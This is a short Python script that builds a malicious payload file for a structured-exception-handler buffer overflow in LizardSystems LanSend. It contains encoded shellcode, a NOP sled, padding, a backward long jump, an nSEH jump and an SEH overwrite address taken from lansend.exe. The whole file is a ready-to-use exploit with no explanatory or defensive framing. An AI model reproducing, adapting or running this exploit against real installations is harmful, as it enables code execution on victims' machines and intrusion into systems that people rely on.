#!/usr/bin/python

f = file('payload.txt','w')

shellcode  = b"\xdb\xc2\xd9\x74\x24\xf4\x58\x2b\xc9\xbb\xc2"
shellcode += b"\x1f\xb2\xa0\xb1\x52\x83\xc0\x04\x31\x58\x13"
shellcode += b"\x03\x9a\x0c\x50\x55\xe6\xdb\x16\x96\x16\x1c"
shellcode += b"\x77\x1e\xf3\x2d\xb7\x44\x70\x1d\x07\x0e\xd4"
shellcode += b"\x92\xec\x42\xcc\x21\x80\x4a\xe3\x82\x2f\xad"
shellcode += b"\xca\x13\x03\x8d\x4d\x90\x5e\xc2\xad\xa9\x90"
shellcode += b"\x17\xac\xee\xcd\xda\xfc\xa7\x9a\x49\x10\xc3"
shellcode += b"\xd7\x51\x9b\x9f\xf6\xd1\x78\x57\xf8\xf0\x2f"
shellcode += b"\xe3\xa3\xd2\xce\x20\xd8\x5a\xc8\x25\xe5\x15"
shellcode += b"\x63\x9d\x91\xa7\xa5\xef\x5a\x0b\x88\xdf\xa8"
shellcode += b"\x55\xcd\xd8\x52\x20\x27\x1b\xee\x33\xfc\x61"
shellcode += b"\x34\xb1\xe6\xc2\xbf\x61\xc2\xf3\x6c\xf7\x81"
shellcode += b"\xf8\xd9\x73\xcd\x1c\xdf\x50\x66\x18\x54\x57"
shellcode += b"\xa8\xa8\x2e\x7c\x6c\xf0\xf5\x1d\x35\x5c\x5b"
shellcode += b"\x21\x25\x3f\x04\x87\x2e\xd2\x51\xba\x6d\xbb"
shellcode += b"\x96\xf7\x8d\x3b\xb1\x80\xfe\x09\x1e\x3b\x68"
shellcode += b"\x22\xd7\xe5\x6f\x45\xc2\x52\xff\xb8\xed\xa2"
shellcode += b"\xd6\x7e\xb9\xf2\x40\x56\xc2\x98\x90\x57\x17"
shellcode += b"\x0e\xc0\xf7\xc8\xef\xb0\xb7\xb8\x87\xda\x37"
shellcode += b"\xe6\xb8\xe5\x9d\x8f\x53\x1c\x76\x70\x0b\x7a"
shellcode += b"\xf3\x18\x4e\x82\xea\x84\xc7\x64\x66\x25\x8e"
shellcode += b"\x3f\x1f\xdc\x8b\xcb\xbe\x21\x06\xb6\x81\xaa"
shellcode += b"\xa5\x47\x4f\x5b\xc3\x5b\x38\xab\x9e\x01\xef"
shellcode += b"\xb4\x34\x2d\x73\x26\xd3\xad\xfa\x5b\x4c\xfa"
shellcode += b"\xab\xaa\x85\x6e\x46\x94\x3f\x8c\x9b\x40\x07"
shellcode += b"\x14\x40\xb1\x86\x95\x05\x8d\xac\x85\xd3\x0e"
shellcode += b"\xe9\xf1\x8b\x58\xa7\xaf\x6d\x33\x09\x19\x24"
shellcode += b"\xe8\xc3\xcd\xb1\xc2\xd3\x8b\xbd\x0e\xa2\x73"
shellcode += b"\x0f\xe7\xf3\x8c\xa0\x6f\xf4\xf5\xdc\x0f\xfb"
shellcode += b"\x2c\x65\x2f\x1e\xe4\x90\xd8\x87\x6d\x19\x85"
shellcode += b"\x37\x58\x5e\xb0\xbb\x68\x1f\x47\xa3\x19\x1a"
shellcode += b"\x03\x63\xf2\x56\x1c\x06\xf4\xc5\x1d\x03"

nSeh = "\xEB\xF9\x90\x90" # short jump back 5 bytes
Seh  = "\x4c\x7b\x41"     # 0x00417b4c : pop ecx # pop ebp # ret 0x04 - C:\Users\Exp\AppData\Local\Programs\LizardSystems\LanSend\lansend.exe

longJump="\xE9\x6C\xFE\xFF\xFF" # jumps to the start of the A buffer

payload = "\x90" * 33
payload += shellcode # 351
payload += "A" * (399 - len(payload))
payload += longJump
payload += nSeh
payload += Seh
#payload += "D" * (2000 - len(payload))

f.write(payload)
f.close()

